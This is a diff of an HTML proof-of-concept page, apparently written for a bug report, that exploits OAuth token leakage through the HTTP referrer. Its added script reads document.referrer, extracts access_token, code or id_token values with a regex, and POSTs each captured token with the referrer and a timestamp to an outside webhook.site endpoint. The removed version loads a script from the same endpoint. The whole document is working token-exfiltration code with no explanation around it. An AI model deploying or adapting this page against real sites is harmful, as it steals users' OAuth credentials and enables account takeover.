@@ -1,12 +1,40 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>PoC Referrer Leak</title>
-    <!-- Embedding the tracking JS -->
-    <script src="https://webhook.site/dfbb8dab-9ac7-4819-874f-bd3c43899a1a"></script>
-  </head>
-  <body>
-    <h1>Hello!</h1>
-  </body>
-</html>
+<head>
+  <title>Referrer Leak PoC</title>
+  <meta charset="UTF-8">
+</head>
+<body>
+  <h2>🔍 Referrer Leak PoC</h2>
+  <p id="referrer"></p>
+  <p id="token"></p>
 
+  <script>
+    // Read document.referrer
+    const ref = document.referrer;
+    document.getElementById("referrer").innerText = "Referrer: " + ref;
+
+    // Try extracting access_token, code, or id_token from the referrer
+    const regex = /(?:access_token|code|id_token)=([^&]+)/i;
+    const match = ref.match(regex);
+
+    if (match) {
+      const token = match[1];
+      document.getElementById("token").innerText = "🚨 Leaked Token: " + token;
+
+      // Send the leaked token to your webhook
+      fetch("https://webhook.site/dfbb8dab-9ac7-4819-874f-bd3c43899a1a", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          leaked_token: token,
+          referrer: ref,
+          timestamp: new Date().toISOString()
+        })
+      });
+    } else {
+      document.getElementById("token").innerText = "❌ No token found in referrer.";
+    }
+  </script>
+</body>
+</html>
